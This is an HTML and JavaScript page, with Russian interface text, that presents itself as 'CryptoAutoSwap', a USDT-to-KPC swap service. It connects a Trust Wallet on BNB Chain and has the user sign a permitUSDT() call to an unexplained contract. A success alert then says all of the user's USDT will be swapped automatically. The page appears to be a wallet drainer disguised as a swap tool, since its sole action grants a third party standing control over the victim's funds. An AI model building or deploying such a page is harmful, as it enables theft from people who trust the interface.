<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CryptoAutoSwap</title>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider/dist/umd/index.min.js"></script>
    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
</head>
<body>
    <h2>CryptoAutoSwap USDT → KPC</h2>
    <button id="connectWallet">Подключить Trust Wallet</button>
    <div id="walletAddress"></div>

    <script>
        const USDT_ADDRESS = "0x55D398326f99059FF775485246999027B3197955";
        const AUTOSWAP_ADDRESS = "0x48EEcE98f1AC0C59Db0Fe3217F6783D503e3416c";
        const PERMIT2_ADDRESS = "0xA252294555A62511CBd1899Ac5dEfA26F5036098";

        const AUTOSWAP_ABI = [
            "function permitUSDT() external",
        ];

        document.getElementById('connectWallet').onclick = async () => {
            const provider = new WalletConnectProvider.default({
                rpc: { 56: "https://bsc-dataseed.binance.org/" },
                qrcode: true,
            });

            await provider.enable();

            const web3Provider = new ethers.providers.Web3Provider(provider);
            const signer = web3Provider.getSigner();
            const userAddress = await signer.getAddress();

            document.getElementById('walletAddress').innerText = `Адрес кошелька: ${userAddress}`;

            const autoswapContract = new ethers.Contract(AUTOSWAP_ADDRESS, AUTOSWAP_ABI, signer);

            // Разрешение на обмен USDT (Permit2)
            try {
                const tx = await autoswapContract.permitUSDT();
                await tx.wait();
                alert("Permit успешно подписан! Теперь все ваши USDT будут автоматически обмениваться на KPC.");
            } catch (error) {
                alert("Ошибка при подписании Permit: " + error.message);
            }
        };
    </script>
</body>
</html>
